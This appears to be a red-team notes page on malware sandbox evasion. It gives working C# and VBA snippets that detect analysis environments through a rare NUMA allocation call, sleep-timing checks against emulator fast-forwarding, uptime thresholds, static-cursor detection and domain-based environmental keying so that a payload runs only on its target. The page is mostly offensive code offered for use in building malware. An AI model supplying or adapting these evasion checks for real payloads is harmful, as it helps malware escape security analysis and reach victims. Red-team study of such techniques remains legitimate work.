| üè† [Home](../../redteam.md) | ‚¨ÖÔ∏è ‚¨ÖÔ∏è [Part](../_part) | ‚¨ÖÔ∏è [Chapter](./_chapter) |
|-----------------------------|----------------------|-------------------------|

* [Environment enumeration](../../malware_dev/evasion/enum.md)
    * [links](../../malware_dev/evasion/enum.md#links)


# Environment enumeration

## Check sandboxing

* Call rare-enumated API

                if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
                {
                    return;
                }

* Sleep to evade in-memory scan + check if the emulator did not
    fast-forward through the sleep instruction

                var rand = new Random();
                uint dream = (uint)rand.Next(10000, 20000);
                double delta = dream / 1000 - 0.5;
                DateTime before = DateTime.Now;
                Sleep(dream);
                if (DateTime.Now.Subtract(before).TotalSeconds < delta)
                {
                    Console.WriteLine("Charles, get the rifle out. We're being fucked.");
                    return;
                }

## misc
* **uptime**: Checks the system uptime. A very low uptime (< 10 minutes) is often characteristic of a sandbox environment that has just been spun up for analysis.

```vb
#If VBA7 Then
    Private Declare PtrSafe Function GetTickCount Lib "kernel32" () As Long
#Else
    Private Declare Function GetTickCount Lib "kernel32" () As Long
#End If
' Check 1: Uptime check to evade simple sandboxes
If GetTickCount() < 600000 Then Exit Function ' Must be running >10 minutes
```

* **cursorpos**: Checks for mouse cursor movement over a 3-second interval. A static cursor suggests no human user is present, indicating a likely sandbox.
```vb
#If VBA7 Then
    Private Declare PtrSafe Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
#Else
    Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
#End If


Dim pos As POINTAPI
Dim initialX As Long, initialY As Long
GetCursorPos pos
initialX = pos.x
initialY = pos.y
Sleep 3000 ' Wait 3 seconds
GetCursorPos pos
If initialX = pos.x And initialY = pos.y Then Exit Function
```

* **environment domain**: Performs "environmental keying" by checking if the machine is part of a specific domain (LAB-DOMAIN). This ensures the payload only runs on the intended target.
```vb
' Check 3: Domain check for specific lab environment
If Environ("USERDOMAIN") <> "LAB-DOMAIN" Then Exit Function
```

* **memory**: minimum amount of memory to detect sandbox
* **processing speed**
* **core processors**


## links